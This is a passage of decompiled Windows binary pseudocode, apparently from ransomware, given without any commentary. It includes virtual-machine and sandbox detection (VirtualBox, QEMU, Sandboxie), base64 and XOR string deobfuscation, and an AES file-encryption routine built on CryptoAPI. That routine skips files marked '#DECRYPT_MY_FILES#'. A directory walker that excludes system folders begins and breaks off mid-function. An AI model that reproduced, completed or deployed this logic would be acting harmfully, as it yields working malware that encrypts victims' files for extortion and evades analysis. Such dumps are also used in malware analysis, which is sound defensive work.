  LOBYTE(Block) = 0;
  if ( a24 >= 0x10 )
  {
    v41 = a19;
    if ( a24 + 1 < 0x1000 )
    {
LABEL_61:
      j__free(v41);
      return v24;
    }
    if ( ((unsigned __int8)a19 & 0x1F) == 0 )
    {
      v42 = *((_DWORD *)a19 - 1);
      if ( v42 < (unsigned int)a19 && (unsigned int)&a19[-v42] >= 4 && (unsigned int)&a19[-v42] <= 0x23 )
      {
        v41 = (char *)*((_DWORD *)a19 - 1);
        goto LABEL_61;
      }
    }
LABEL_63:
    _invalid_parameter_noinfo_noreturn();
  }
  return v24;
}
// 40163E: variable 'v34' is possibly undefined

//----- (004017D0) --------------------------------------------------------
bool sub_4017D0()
{
  bool v1; // bl
  CHAR *v2[6]; // [esp-60h] [ebp-A0h] BYREF
  char *v3[4]; // [esp-48h] [ebp-88h] BYREF
  int v4; // [esp-38h] [ebp-78h]
  unsigned int v5; // [esp-34h] [ebp-74h]
  char *v6[4]; // [esp-30h] [ebp-70h] BYREF
  int v7; // [esp-20h] [ebp-60h]
  unsigned int v8; // [esp-1Ch] [ebp-5Ch]
  char *v9[4]; // [esp-18h] [ebp-58h] BYREF
  int v10; // [esp-8h] [ebp-48h]
  unsigned int v11; // [esp-4h] [ebp-44h]
  void *v12; // [esp+Ch] [ebp-34h]
  void *v13; // [esp+10h] [ebp-30h]
  HKEY phkResult; // [esp+14h] [ebp-2Ch] BYREF
  char *Src[6]; // [esp+18h] [ebp-28h] BYREF
  int v16; // [esp+3Ch] [ebp-4h]

  if ( sub_401230() )
    return 1;
  phkResult = 0;
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, 0x20019u, &phkResult) )
    return 1;
  Src[4] = 0;
  Src[5] = (char *)15;
  LOBYTE(Src[0]) = 0;
  v16 = 0;
  sub_401D10(Src, "HARDWARE\\Description\\System", 0x1Bu);
  phkResult = (HKEY)v9;
  v10 = 0;
  v11 = 15;
  LOBYTE(v9[0]) = 0;
  sub_401D10(v9, (void *)Locale, 0);
  LOBYTE(v16) = 1;
  v13 = v6;
  v7 = 0;
  v8 = 15;
  LOBYTE(v6[0]) = 0;
  sub_401D10(v6, "QEMU", 4u);
  LOBYTE(v16) = 2;
  v12 = v3;
  v4 = 0;
  v5 = 15;
  LOBYTE(v3[0]) = 0;
  sub_401D10(v3, "SystemBiosVersion", 0x11u);
  LOBYTE(v16) = 3;
  sub_401A10(v2, Src);
  LOBYTE(v16) = 0;
  v1 = sub_4014B0(
         v2[0],
         (int)v2[1],
         (int)v2[2],
         (int)v2[3],
         (int)v2[4],
         (unsigned int)v2[5],
         v3[0],
         (int)v3[1],
         (int)v3[2],
         (int)v3[3],
         v4,
         v5,
         v6[0],
         (int)v6[1],
         (int)v6[2],
         (int)v6[3],
         v7,
         v8,
         v9[0],
         (int)v9[1],
         (int)v9[2],
         (int)v9[3],
         v10,
         v11)
    || GetModuleHandleA("SbieDll.dll");
  sub_401970(Src);
  return v1;
}

//----- (00401930) --------------------------------------------------------
int __thiscall sub_401930(char *this, int a2, int a3)
{
  char *v3; // edx
  char *v4; // esi

  v3 = (char *)a2;
  if ( *(_DWORD *)(a2 + 20) >= 0x10u )
    v3 = *(char **)a2;
  v4 = this;
  if ( *((_DWORD *)this + 5) >= 0x10u )
    v4 = *(char **)this;
  return sub_401E30(v4, *((_DWORD *)this + 4), (int)this, v3, *(_DWORD *)(a2 + 16));
}

//----- (00401970) --------------------------------------------------------
void __thiscall sub_401970(char **this)
{
  char *v2; // eax
  char *v3; // edx
  char *v4; // eax
  unsigned int v5; // edx

  v2 = this[5];
  if ( (unsigned int)v2 >= 0x10 )
  {
    v3 = *this;
    if ( (unsigned int)(v2 + 1) >= 0x1000 )
    {
      if ( ((unsigned __int8)v3 & 0x1F) != 0
        || (v4 = (char *)*((_DWORD *)v3 - 1), v4 >= v3)
        || (v5 = v3 - v4, v5 < 4)
        || v5 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v3 = v4;
    }
    j__free(v3);
  }
  this[4] = 0;
  this[5] = (char *)15;
  *(_BYTE *)this = 0;
}

//----- (004019D0) --------------------------------------------------------
char **__thiscall sub_4019D0(char **this, void *Src)
{
  this[4] = 0;
  this[5] = (char *)15;
  *(_BYTE *)this = 0;
  sub_401D10(this, Src, strlen((const char *)Src));
  return this;
}

//----- (00401A10) --------------------------------------------------------
_DWORD *__thiscall sub_401A10(_DWORD *this, _DWORD *Src)
{
  _OWORD *v2; // ebx
  unsigned int v4; // eax
  _DWORD *result; // eax
  int v6; // esi
  void *v7; // eax
  unsigned int v8; // [esp+8h] [ebp-4h]

  v2 = Src;
  this[4] = 0;
  this[5] = 0;
  v4 = Src[4];
  v8 = v4;
  if ( Src[5] >= 0x10u )
    v2 = (_OWORD *)*Src;
  if ( v4 >= 0x10 )
  {
    v6 = v4 | 0xF;
    if ( (v4 | 0xF) > 0x7FFFFFFF )
      v6 = 0x7FFFFFFF;
    v7 = sub_401C70(v6 + 1);
    *this = v7;
    memmove_0(v7, v2, v8 + 1);
    this[5] = v6;
    this[4] = v8;
    return this;
  }
  else
  {
    *(_OWORD *)this = *v2;
    this[4] = v4;
    result = this;
    this[5] = 15;
  }
  return result;
}

//----- (00401AB0) --------------------------------------------------------
void __stdcall sub_401AB0(_DWORD *Block)
{
  _DWORD *v1; // esi
  _DWORD *i; // edi
  unsigned int v3; // ecx
  _DWORD *v4; // eax
  unsigned int v5; // ecx

  v1 = Block;
  for ( i = Block; !*((_BYTE *)i + 13); v1 = i )
  {
    sub_401AB0((_DWORD *)i[2]);
    v3 = v1[9];
    i = (_DWORD *)*i;
    if ( v3 >= 0x10 )
    {
      v4 = (_DWORD *)v1[4];
      if ( v3 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v4 & 0x1F) != 0
          || (v5 = *(v4 - 1), v5 >= (unsigned int)v4)
          || (unsigned int)v4 - v5 - 4 > 0x1F )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v4 = (_DWORD *)*(v4 - 1);
      }
      j__free(v4);
    }
    v1[8] = 0;
    v1[9] = 15;
    *((_BYTE *)v1 + 16) = 0;
    j__free(v1);
  }
}

//----- (00401B40) --------------------------------------------------------
char __thiscall sub_401B40(char *Src, char a2)
{
  char *v2; // esi
  unsigned int v3; // ecx
  size_t v4; // edi
  char result; // al
  int v6; // edx
  unsigned int v7; // ebx
  void *v8; // ebx
  char *v9; // ebx
  char *v10; // eax
  unsigned int v11; // ebx
  unsigned int v12; // [esp+8h] [ebp-Ch]
  int v13; // [esp+Ch] [ebp-8h]
  void *v14; // [esp+10h] [ebp-4h]
  void *v15; // [esp+10h] [ebp-4h]

  v2 = Src;
  v3 = *((_DWORD *)Src + 5);
  v4 = *((_DWORD *)v2 + 4);
  v12 = v3;
  if ( v4 >= v3 )
  {
    if ( v4 == 0x7FFFFFFF )
      sub_401F10();
    v6 = 0x7FFFFFFF;
    v7 = (v4 + 1) | 0xF;
    v13 = 0x7FFFFFFF;
    if ( v7 <= 0x7FFFFFFF )
    {
      v14 = (void *)(v3 >> 1);
      if ( v3 <= 0x7FFFFFFF - (v3 >> 1) )
      {
        v6 = (v4 + 1) | 0xF;
        if ( v7 < (unsigned int)v14 + v3 )
          v6 = (int)v14 + v3;
      }
      v13 = v6;
    }
    v8 = sub_401C70(__CFADD__(v6, 1) ? -1 : v6 + 1);
    v15 = v8;
    *((_DWORD *)v2 + 4) = v4 + 1;
    *((_DWORD *)v2 + 5) = v13;
    if ( v12 < 0x10 )
    {
      memmove_0(v8, v2, v4);
      result = a2;
      *((_BYTE *)v8 + v4) = a2;
      *((_BYTE *)v8 + v4 + 1) = 0;
      *(_DWORD *)v2 = v8;
    }
    else
    {
      v9 = *(char **)v2;
      memmove_0(v15, *(const void **)v2, v4);
      *((_BYTE *)v15 + v4) = a2;
      *((_BYTE *)v15 + v4 + 1) = 0;
      if ( v12 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v9 & 0x1F) != 0
          || (v10 = (char *)*((_DWORD *)v9 - 1), v10 >= v9)
          || (v11 = v9 - v10, v11 < 4)
          || v11 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v9 = v10;
      }
      j__free(v9);
      result = (char)v15;
      *(_DWORD *)v2 = v15;
    }
  }
  else
  {
    *((_DWORD *)v2 + 4) = v4 + 1;
    if ( v3 >= 0x10 )
      v2 = *(char **)v2;
    result = a2;
    v2[v4] = a2;
    v2[v4 + 1] = 0;
  }
  return result;
}

//----- (00401C70) --------------------------------------------------------
void *__stdcall sub_401C70(size_t Size)
{
  void *v2; // eax

  if ( !Size )
    return 0;
  if ( Size < 0x1000 )
    return operator new(Size);
  if ( Size + 35 <= Size )
    sub_415388();
  v2 = operator new(Size + 35);
  *(_DWORD *)((((unsigned int)v2 + 35) & 0xFFFFFFE0) - 4) = v2;
  return (void *)(((unsigned int)v2 + 35) & 0xFFFFFFE0);
}

//----- (00401CD0) --------------------------------------------------------
void __stdcall sub_401CD0(_DWORD *Block, unsigned int a2)
{
  _DWORD *v2; // eax
  unsigned int v3; // ecx

  v2 = Block;
  if ( a2 >= 0x1000 )
  {
    if ( ((unsigned __int8)Block & 0x1F) != 0
      || (v3 = *(Block - 1), v3 >= (unsigned int)Block)
      || (unsigned int)Block - v3 < 4
      || (unsigned int)Block - v3 > 0x23 )
    {
      _invalid_parameter_noinfo_noreturn();
    }
    v2 = (_DWORD *)*(Block - 1);
  }
  j__free(v2);
}

//----- (00401D10) --------------------------------------------------------
char **__thiscall sub_401D10(char **this, void *Src, size_t Size)
{
  unsigned int v4; // ecx
  void **v5; // ebx
  size_t v7; // ebx
  char *v8; // eax
  char *v9; // ebx
  char *v10; // ecx
  char *v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // [esp+Ch] [ebp-Ch]
  unsigned int v14; // [esp+14h] [ebp-4h]

  v4 = (unsigned int)this[5];
  v13 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_401F10();
    v7 = 0x7FFFFFFF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v14 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        v7 = Size | 0xF;
        if ( (Size | 0xF) < v4 + v14 )
          v7 = v4 + v14;
      }
    }
    v8 = (char *)sub_401C70(__CFADD__(v7, 1) ? -1 : v7 + 1);
    this[5] = (char *)v7;
    v9 = v8;
    this[4] = (char *)Size;
    memmove_0(v8, Src, Size);
    v9[Size] = 0;
    if ( v13 >= 0x10 )
    {
      v10 = *this;
      if ( v13 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v10 & 0x1F) != 0
          || (v11 = (char *)*((_DWORD *)v10 - 1), v11 >= v10)
          || (v12 = v10 - v11, v12 < 4)
          || v12 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v10 = v11;
      }
      j__free(v10);
    }
    *this = v9;
    return this;
  }
  else
  {
    v5 = (void **)this;
    if ( v4 >= 0x10 )
      v5 = (void **)*this;
    this[4] = (char *)Size;
    memmove(v5, Src, Size);
    *((_BYTE *)v5 + Size) = 0;
    return this;
  }
}

//----- (00401E10) --------------------------------------------------------
_DWORD *sub_401E10()
{
  _DWORD *result; // eax

  result = operator new(0x28u);
  *result = result;
  result[1] = result;
  result[2] = result;
  *((_WORD *)result + 6) = 257;
  return result;
}

//----- (00401E30) --------------------------------------------------------
int __fastcall sub_401E30(char *Buf, unsigned int a2, int a3, char *a4, unsigned int a5)
{
  int v6; // edx
  char *v7; // edi
  char *v8; // edx
  char *v9; // esi
  unsigned int v10; // ecx
  bool v11; // cf
  unsigned __int8 v12; // al
  unsigned __int8 v13; // al
  unsigned __int8 v14; // al
  int v15; // eax
  char *v17; // [esp+8h] [ebp-4h]

  if ( a5 <= a2 )
  {
    if ( !a5 )
      return 0;
    v6 = a2 + 1;
    v17 = &Buf[v6 - a5];
    v7 = (char *)memchr(Buf, *a4, v6 - a5);
    if ( !v7 )
      return -1;
    while ( 1 )
    {
      v8 = v7;
      v9 = a4;
      v10 = a5 - 4;
      if ( a5 < 4 )
      {
LABEL_8:
        if ( v10 == -4 )
          goto LABEL_17;
      }
      else
      {
        while ( *(_DWORD *)v8 == *(_DWORD *)v9 )
        {
          v8 += 4;
          v9 += 4;
          v11 = v10 < 4;
          v10 -= 4;
          if ( v11 )
            goto LABEL_8;
        }
      }
      v11 = (unsigned __int8)*v8 < (unsigned __int8)*v9;
      if ( *v8 != *v9
        || v10 != -3
        && ((v12 = v8[1], v11 = v12 < (unsigned __int8)v9[1], v12 != v9[1])
         || v10 != -2
         && ((v13 = v8[2], v11 = v13 < (unsigned __int8)v9[2], v13 != v9[2])
          || v10 != -1 && (v14 = v8[3], v11 = v14 < (unsigned __int8)v9[3], v14 != v9[3]))) )
      {
        v15 = v11 ? -1 : 1;
        goto LABEL_18;
      }
LABEL_17:
      v15 = 0;
LABEL_18:
      if ( !v15 )
        return v7 - Buf;
      v7 = (char *)memchr(v7 + 1, *a4, v17 - (v7 + 1));
      if ( !v7 )
        return -1;
    }
  }
  return -1;
}

//----- (00401F10) --------------------------------------------------------
void __noreturn sub_401F10()
{
  sub_41349F((int)"string too long");
}

//----- (00401F20) --------------------------------------------------------
bool __fastcall sub_401F20(int *a1, int a2)
{
  int *v3; // edx
  unsigned int v4; // edi
  unsigned int v5; // edx
  unsigned int v6; // edx
  bool v7; // cf
  unsigned __int8 v8; // al
  unsigned __int8 v9; // al
  unsigned __int8 v10; // al
  int v11; // eax

  v3 = a1;
  v4 = strlen((const char *)a2);
  if ( (unsigned int)a1[5] >= 0x10 )
    a1 = (int *)*a1;
  v5 = v3[4];
  if ( v5 != v4 )
    return 0;
  v7 = v5 < 4;
  v6 = v5 - 4;
  if ( v7 )
  {
LABEL_7:
    if ( v6 == -4 )
      goto LABEL_16;
  }
  else
  {
    while ( *a1 == *(_DWORD *)a2 )
    {
      ++a1;
      a2 += 4;
      v7 = v6 < 4;
      v6 -= 4;
      if ( v7 )
        goto LABEL_7;
    }
  }
  v7 = *(_BYTE *)a1 < *(_BYTE *)a2;
  if ( *(_BYTE *)a1 != *(_BYTE *)a2
    || v6 != -3
    && ((v8 = *((_BYTE *)a1 + 1), v7 = v8 < *(_BYTE *)(a2 + 1), v8 != *(_BYTE *)(a2 + 1))
     || v6 != -2
     && ((v9 = *((_BYTE *)a1 + 2), v7 = v9 < *(_BYTE *)(a2 + 2), v9 != *(_BYTE *)(a2 + 2))
      || v6 != -1 && (v10 = *((_BYTE *)a1 + 3), v7 = v10 < *(_BYTE *)(a2 + 3), v10 != *(_BYTE *)(a2 + 3)))) )
  {
    v11 = v7 ? -1 : 1;
    return !v11;
  }
LABEL_16:
  v11 = 0;
  return !v11;
}

//----- (00401FB0) --------------------------------------------------------
void *sub_401FB0()
{
  return &unk_4537F0;
}

//----- (00401FC0) --------------------------------------------------------
int __fastcall sub_401FC0(int a1, int a2, int a3, int a4)
{
  int *v4; // eax

  v4 = (int *)sub_401FB0();
  return sub_41BEE7(*v4, v4[1], a1, a2, 0, a4);
}

//----- (00401FF0) --------------------------------------------------------
int sub_401FF0(int a1, int a2, ...)
{
  va_list va; // [esp+10h] [ebp+10h] BYREF

  va_start(va, a2);
  return sub_401FC0(a1, a2, a1, (int)va);
}

//----- (00402080) --------------------------------------------------------
void *__fastcall sub_402080(_DWORD *a1, int *a2)
{
  int v2; // ecx
  int v3; // edx
  int v4; // esi
  unsigned __int8 *v5; // edi
  int v6; // ebx
  int v7; // ecx
  int v8; // eax
  int v10; // [esp+0h] [ebp-44h]
  int v11; // [esp+1Ch] [ebp-28h] BYREF
  void *Src; // [esp+20h] [ebp-24h]
  int *i; // [esp+24h] [ebp-20h]
  __int64 v14; // [esp+28h] [ebp-1Ch] BYREF
  int v15; // [esp+30h] [ebp-14h]
  int v16; // [esp+40h] [ebp-4h]

  i = a2;
  Src = a1;
  a1[4] = 0;
  a1[5] = 15;
  *(_BYTE *)a1 = 0;
  v16 = 0;
  v14 = 0i64;
  v15 = 0;
  v11 = -1;
  sub_402630(&v14, (int)a1, &v11, v10);
  v16 = 1;
  v2 = 0;
  v3 = v14;
  do
  {
    *(_DWORD *)(v3 + 4 * BASE64_table_441970[v2]) = v2;
    ++v2;
  }
  while ( v2 < 64 );
  v4 = 0;
  v5 = (unsigned __int8 *)i;
  v6 = -8;
  if ( (unsigned int)i[5] < 0x10 )
  {
    v7 = (int)i;
  }
  else
  {
    v5 = (unsigned __int8 *)*i;
    v7 = *i;
  }
  for ( i = (int *)(v7 + i[4]); v5 != (unsigned __int8 *)i; ++v5 )
  {
    v8 = *(_DWORD *)(v3 + 4 * *v5);
    if ( v8 == -1 )
      break;
    v4 = v8 + (v4 << 6);
    v6 += 6;
    if ( v6 >= 0 )
    {
      sub_401B40((char *)Src, v4 >> v6);
      v3 = v14;
      v6 -= 8;
    }
  }
  sub_402690((void **)&v14);
  return Src;
}
// 4020FE: variable 'v10' is possibly undefined

//----- (004021A0) --------------------------------------------------------
_DWORD *__cdecl sub_4021A0(_DWORD *Block, int a2, int a3, int a4, unsigned int a5, unsigned int a6)
{
  _DWORD *v6; // ecx
  _DWORD *v7; // esi
  unsigned int i; // ecx
  _DWORD **p_Block; // edx
  _DWORD *v10; // edi
  _DWORD *v11; // ecx
  unsigned int v12; // eax
  __int128 v14; // [esp+Ch] [ebp-20h]
  _DWORD *v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]

  v7 = v6;
  v15 = v6;
  v16 = 0;
  v14 = xmmword_442B40;
  sub_401A10(v6, &Block);
  for ( i = 0; i < a5; ++i )
  {
    p_Block = &Block;
    v10 = v7;
    if ( a6 >= 0x10 )
      p_Block = (_DWORD **)Block;
    if ( v7[5] >= 0x10u )
      v10 = (_DWORD *)*v7;
    *((_BYTE *)v10 + i) = *((_BYTE *)p_Block + i) ^ *((_BYTE *)&v14 + (i & 0xF));
  }
  if ( a6 >= 0x10 )
  {
    v11 = Block;
    if ( a6 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)Block & 0x1F) != 0
        || (v12 = *(Block - 1), v12 >= (unsigned int)Block)
        || (unsigned int)Block - v12 < 4
        || (unsigned int)Block - v12 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v11 = (_DWORD *)*(Block - 1);
    }
    j__free(v11);
  }
  return v7;
}
// 4021C7: variable 'v6' is possibly undefined
// 442B40: using guessed type __int128 xmmword_442B40;

//----- (00402270) --------------------------------------------------------
bool __stdcall sub_402270(CHAR *lpFileName, LPCSTR a2, const CHAR *a3)
{
  char *v3; // ecx
  HANDLE FileA; // ebx
  DWORD LastError; // esi
  bool v6; // bl
  BOOL v7; // esi
  void *v8; // ecx
  void *v9; // eax
  BYTE *pbData; // [esp+10h] [ebp-13Ch]
  BYTE *pbDataa; // [esp+10h] [ebp-13Ch]
  CHAR *lpMultiByteStr; // [esp+14h] [ebp-138h]
  int dwDataLen; // [esp+18h] [ebp-134h]
  DWORD dwDataLena; // [esp+18h] [ebp-134h]
  void *Block[4]; // [esp+1Ch] [ebp-130h] BYREF
  unsigned int v17; // [esp+2Ch] [ebp-120h]
  unsigned int v18; // [esp+30h] [ebp-11Ch]
  DWORD NumberOfBytesWritten; // [esp+34h] [ebp-118h] BYREF
  HCRYPTKEY phKey; // [esp+38h] [ebp-114h] BYREF
  HCRYPTHASH phHash; // [esp+3Ch] [ebp-110h] BYREF
  DWORD NumberOfBytesRead; // [esp+40h] [ebp-10Ch] BYREF
  HCRYPTPROV phProv; // [esp+44h] [ebp-108h] BYREF
  WCHAR szProvider[56]; // [esp+48h] [ebp-104h] BYREF
  BYTE Buffer[128]; // [esp+B8h] [ebp-94h] BYREF
  int v26; // [esp+148h] [ebp-4h]

  v17 = 0;
  v18 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, lpFileName, strlen(lpFileName));
  v26 = 0;
  v3 = (char *)Block;
  if ( v18 >= 0x10 )
    v3 = (char *)Block[0];
  if ( sub_401E30(v3, v17, (int)v3, "#DECRYPT_MY_FILES#", 0x12u) != -1 )
    goto LABEL_19;
  pbData = (BYTE *)unknown_libname_5(0x2000);
  MultiByteToWideChar(0, 0, a3, -1, (LPWSTR)pbData, 4096);
  dwDataLen = lstrlenW((LPCWSTR)pbData);
  FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x8000000u, 0);
  if ( FileA == (HANDLE)-1 )
    goto LABEL_19;
  lpMultiByteStr = (CHAR *)CreateFileA(a2, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if ( lpMultiByteStr == (CHAR *)-1 )
    goto LABEL_19;
  qmemcpy(szProvider, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 0x6Cu);
  if ( !CryptAcquireContextW(&phProv, 0, szProvider, 0x18u, 0xF0000000)
    || !CryptCreateHash(phProv, 0x800Cu, 0, 0, &phHash) )
  {
    goto LABEL_11;
  }
  if ( CryptHashData(phHash, pbData, dwDataLen, 0) )
  {
    if ( CryptDeriveKey(phProv, 0x660Eu, phHash, 0, &phKey) )
    {
      memset(Buffer, 0, sizeof(Buffer));
      NumberOfBytesRead = 0;
      v7 = 0;
      dwDataLena = 0;
      pbDataa = (BYTE *)GetFileSize(FileA, 0);
      while ( ReadFile(FileA, Buffer, 0x80u, &NumberOfBytesRead, 0) )
      {
        if ( !NumberOfBytesRead )
          break;
        dwDataLena += NumberOfBytesRead;
        if ( (BYTE *)dwDataLena == pbDataa )
          v7 = 1;
        CryptEncrypt(phKey, 0, v7, 0, Buffer, &NumberOfBytesRead, 0x80u);
        NumberOfBytesWritten = 0;
        if ( !WriteFile(lpMultiByteStr, Buffer, NumberOfBytesRead, &NumberOfBytesWritten, 0) )
          break;
        memset(Buffer, 0, sizeof(Buffer));
      }
      CryptReleaseContext(phProv, 0);
      CryptDestroyKey(phKey);
      CryptDestroyHash(phHash);
      CloseHandle(FileA);
      CloseHandle(lpMultiByteStr);
      goto LABEL_19;
    }
LABEL_11:
    LastError = GetLastError();
    CryptReleaseContext(phProv, 0);
    v6 = LastError != 0;
    goto LABEL_20;
  }
  GetLastError();
LABEL_19:
  v6 = 1;
LABEL_20:
  if ( v18 >= 0x10 )
  {
    v8 = Block[0];
    if ( v18 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0
        || (v9 = (void *)*((_DWORD *)Block[0] - 1), v9 >= Block[0])
        || (unsigned int)(Block[0] - v9) < 4
        || (unsigned int)(Block[0] - v9) > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v8 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v8);
  }
  return v6;
}
// 414B29: using guessed type int __cdecl unknown_libname_5(_DWORD);
// 4419C8: using guessed type wchar_t aMicrosoftEnhan[54];

//----- (00402630) --------------------------------------------------------
_DWORD *__thiscall sub_402630(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  void *v5; // eax

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  v5 = operator new(0x400u);
  *this = v5;
  this[1] = v5;
  this[2] = *this + 1024;
  this[1] = sub_402700(a3);
  return this;
}

//----- (00402690) --------------------------------------------------------
void __thiscall sub_402690(void **this)
{
  _BYTE *v2; // edx
  unsigned int v3; // eax
  _BYTE *v4; // eax
  unsigned int v5; // edx

  v2 = *this;
  if ( *this )
  {
    v3 = ((_BYTE *)this[2] - v2) >> 2;
    if ( v3 <= 0x3FFFFFFF )
    {
      if ( 4 * v3 < 0x1000 )
      {
LABEL_9:
        j__free(v2);
        *this = 0;
        this[1] = 0;
        this[2] = 0;
        return;
      }
      if ( ((unsigned __int8)v2 & 0x1F) == 0 )
      {
        v4 = (_BYTE *)*((_DWORD *)v2 - 1);
        if ( v4 < v2 )
        {
          v5 = v2 - v4;
          if ( v5 >= 4 && v5 <= 0x23 )
          {
            v2 = v4;
            goto LABEL_9;
          }
        }
      }
    }
    _invalid_parameter_noinfo_noreturn();
  }
}

//----- (00402700) --------------------------------------------------------
_DWORD *__cdecl sub_402700(_DWORD *a1)
{
  _DWORD *v1; // ecx
  int v2; // edx

  v2 = 256;
  do
  {
    *v1++ = *a1;
    --v2;
  }
  while ( v2 );
  return v1;
}
// 402712: variable 'v1' is possibly undefined

//----- (00402730) --------------------------------------------------------
DWORD __fastcall sub_402730(int *a1, _DWORD *a2, _DWORD *a3, int a4)
{
  _BYTE *v4; // edi
  char **v5; // eax
  CHAR *v6; // ecx
  char *v7; // eax
  char *v8; // ecx
  char *v9; // eax
  char *v10; // ecx
  char *v11; // eax
  char *v12; // ecx
  char *v13; // eax
  char *v14; // ecx
  int v15; // ecx
  int v16; // ecx
  int v17; // ecx
  int v18; // ecx
  int v19; // ecx
  const CHAR *v20; // eax
  HANDLE FirstFileA; // eax
  int v22; // ebx
  void *v23; // esi
  void **v24; // eax
  char **v25; // eax
  char **v26; // edx
  DWORD LastError; // esi
  void **v29; // edx
  void **i; // ecx
  int v31; // ecx
  char **v32; // eax
  void **v33; // eax
  void **v34; // ecx
  void **v35; // ebx
  int v36; // eax
  char v37; // cl
  _BYTE *v38; // eax
  _BYTE *v39; // esi
  _BYTE *v40; // eax
  int *v41; // ebx
  void *v42; // ecx
  void *v43; // eax
  void *v44; // ecx
  void *v45; // eax
  void *v46; // ecx
  void *v47; // eax
  void *v48; // ecx
  void *v49; // eax
  void *v50; // ecx
  void *v51; // eax
  void *v52; // ecx
  void *v53; // eax
  void *v54; // ecx
  void *v55; // eax
  void *v56; // ecx
  void *v57; // eax
  void *v58; // ecx
  void *v59; // eax
  void *v60; // ecx
  void *v61; // eax
  CHAR *v62; // ecx
  LPCSTR v63; // eax
  void *v64; // ecx
  void *v65; // eax
  void *v66; // [esp-4h] [ebp-2C4h]
  int v67; // [esp+0h] [ebp-2C0h] BYREF
  char *v68[6]; // [esp+18h] [ebp-2A8h] BYREF
  int v69; // [esp+30h] [ebp-290h]
  void *v70; // [esp+34h] [ebp-28Ch]
  int *v71; // [esp+38h] [ebp-288h]
  _DWORD *v72; // [esp+3Ch] [ebp-284h]
  HANDLE v73; // [esp+40h] [ebp-280h]
  _BYTE *v74; // [esp+44h] [ebp-27Ch]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+48h] [ebp-278h] BYREF
  void *v76[4]; // [esp+18Ch] [ebp-134h] BYREF
  int v77; // [esp+19Ch] [ebp-124h]
  unsigned int v78; // [esp+1A0h] [ebp-120h]
  void *v79[4]; // [esp+1A4h] [ebp-11Ch] BYREF
  int v80; // [esp+1B4h] [ebp-10Ch]
  unsigned int v81; // [esp+1B8h] [ebp-108h]
  void *v82[4]; // [esp+1BCh] [ebp-104h] BYREF
  int v83; // [esp+1CCh] [ebp-F4h]
  unsigned int v84; // [esp+1D0h] [ebp-F0h]
  void *v85[4]; // [esp+1D4h] [ebp-ECh] BYREF
  int v86; // [esp+1E4h] [ebp-DCh]
  unsigned int v87; // [esp+1E8h] [ebp-D8h]
  void *Block[4]; // [esp+1ECh] [ebp-D4h] BYREF
  int v89; // [esp+1FCh] [ebp-C4h]
  unsigned int v90; // [esp+200h] [ebp-C0h]
  void *Src[4]; // [esp+204h] [ebp-BCh] BYREF
  int v92; // [esp+214h] [ebp-ACh]
  unsigned int v93; // [esp+218h] [ebp-A8h]
  void *v94[4]; // [esp+21Ch] [ebp-A4h] BYREF
  int v95; // [esp+22Ch] [ebp-94h]
  unsigned int v96; // [esp+230h] [ebp-90h]
  void *v97[4]; // [esp+234h] [ebp-8Ch] BYREF
  int v98; // [esp+244h] [ebp-7Ch]
  unsigned int v99; // [esp+248h] [ebp-78h]
  void *v100[4]; // [esp+24Ch] [ebp-74h] BYREF
  int v101; // [esp+25Ch] [ebp-64h]
  unsigned int v102; // [esp+260h] [ebp-60h]
  void *v103[4]; // [esp+264h] [ebp-5Ch] BYREF
  int v104; // [esp+274h] [ebp-4Ch]
  unsigned int v105; // [esp+278h] [ebp-48h]
  void *v106[4]; // [esp+27Ch] [ebp-44h] BYREF
  int v107; // [esp+28Ch] [ebp-34h]
  unsigned int v108; // [esp+290h] [ebp-30h]
  LPCSTR lpFileName[4]; // [esp+294h] [ebp-2Ch] BYREF
  unsigned int v110; // [esp+2A4h] [ebp-1Ch]
  unsigned int v111; // [esp+2A8h] [ebp-18h]
  int *v112; // [esp+2B0h] [ebp-10h]
  int v113; // [esp+2BCh] [ebp-4h]

  v112 = &v67;
  v70 = a2;
  v71 = a1;
  v113 = 1;
  v72 = a3;
  v92 = 0;
  v93 = 15;
  LOBYTE(Src[0]) = 0;
  sub_401A10(lpFileName, a2);
  v107 = 0;
  v108 = 15;
  LOBYTE(v106[0]) = 0;
  LOBYTE(v113) = 3;
  v4 = (_BYTE *)*a3;
  v5 = sub_4036D0((char **)lpFileName, "\\*.*", 4u);
  if ( lpFileName != (LPCSTR *)v5 )
  {
    v6 = (CHAR *)v5;
    if ( (unsigned int)v5[5] >= 0x10 )
      v6 = *v5;
    sub_401D10((char **)lpFileName, v6, (size_t)v5[4]);
  }
  v95 = 0;
  v96 = 15;
  LOBYTE(v94[0]) = 0;
  sub_401D10((char **)v94, "\\Program Files", 0xEu);
  LOBYTE(v113) = 4;
  v98 = 0;
  v99 = 15;
  LOBYTE(v97[0]) = 0;
  sub_401D10((char **)v97, "Windows\\", 8u);
  LOBYTE(v113) = 5;
  v101 = 0;
  v102 = 15;
  LOBYTE(v100[0]) = 0;
  sub_401D10((char **)v100, ":\\ProgramData\\", 0xEu);
  LOBYTE(v113) = 6;
  v104 = 0;
  v105 = 15;
  LOBYTE(v103[0]) = 0;
